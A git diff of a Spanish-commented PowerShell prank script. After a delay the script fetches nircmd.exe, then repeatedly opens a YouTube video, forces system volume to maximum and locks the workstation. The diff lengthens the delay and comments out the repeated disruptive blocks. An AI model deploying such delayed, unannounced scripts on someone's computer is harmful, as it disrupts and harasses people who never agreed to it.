@@ -9,7 +9,7 @@ Start-Process notepad.exe $file
 
 
 ############ DESCARGAR .EXE QUE SUBE EL VOLUMEN ############
-Start-Sleep -Seconds 360
+Start-Sleep -Seconds 600
 
 $nirPath = Join-Path $Temp 'nircmd.exe'
 if (-not (Test-Path $nirPath)) {
@@ -71,72 +71,72 @@ Start-Sleep -Seconds 4
 
 
 
-############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
-Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"
+# ############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
+# Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"
 
-& $nirPath mutesysvolume 0
-& $nirPath setsysvolume 65535
+# & $nirPath mutesysvolume 0
+# & $nirPath setsysvolume 65535
 
-Start-Process rundll32.exe 'user32.dll,LockWorkStation'
+# Start-Process rundll32.exe 'user32.dll,LockWorkStation'
 
-Start-Sleep -Seconds 4
-
-
-
-############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
-Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"
-
-& $nirPath mutesysvolume 0
-& $nirPath setsysvolume 65535
-
-Start-Process rundll32.exe 'user32.dll,LockWorkStation'
-
-Start-Sleep -Seconds 4
+# Start-Sleep -Seconds 4
 
 
 
-############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
-Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"
+# ############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
+# Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"
 
-& $nirPath mutesysvolume 0
-& $nirPath setsysvolume 65535
+# & $nirPath mutesysvolume 0
+# & $nirPath setsysvolume 65535
 
-Start-Process rundll32.exe 'user32.dll,LockWorkStation'
+# Start-Process rundll32.exe 'user32.dll,LockWorkStation'
 
-Start-Sleep -Seconds 4
-
-
-
-############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
-Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"
-
-& $nirPath mutesysvolume 0
-& $nirPath setsysvolume 65535
-
-Start-Process rundll32.exe 'user32.dll,LockWorkStation'
-
-Start-Sleep -Seconds 4
+# Start-Sleep -Seconds 4
 
 
 
-############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
-Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"
+# ############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
+# Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"
 
-& $nirPath mutesysvolume 0
-& $nirPath setsysvolume 65535
+# & $nirPath mutesysvolume 0
+# & $nirPath setsysvolume 65535
 
-Start-Process rundll32.exe 'user32.dll,LockWorkStation'
+# Start-Process rundll32.exe 'user32.dll,LockWorkStation'
 
-Start-Sleep -Seconds 4
+# Start-Sleep -Seconds 4
 
 
 
-############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
-Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"
+# ############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
+# Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"
 
-& $nirPath mutesysvolume 0
-& $nirPath setsysvolume 65535
+# & $nirPath mutesysvolume 0
+# & $nirPath setsysvolume 65535
 
-Start-Process rundll32.exe 'user32.dll,LockWorkStation'
+# Start-Process rundll32.exe 'user32.dll,LockWorkStation'
 
-Start-Sleep -Seconds 4
+# Start-Sleep -Seconds 4
+
+
+
+# ############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
+# Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"
+
+# & $nirPath mutesysvolume 0
+# & $nirPath setsysvolume 65535
+
+# Start-Process rundll32.exe 'user32.dll,LockWorkStation'
+
+# Start-Sleep -Seconds 4
+
+
+
+# ############ ABRIR VIDEO, SUBIR VIDEO Y BLOQUEAR ############
+# Start-Process "https://www.youtube.com/watch?v=2iMQcqGK8yg"
+
+# & $nirPath mutesysvolume 0
+# & $nirPath setsysvolume 65535
+
+# Start-Process rundll32.exe 'user32.dll,LockWorkStation'
+
+# Start-Sleep -Seconds 4
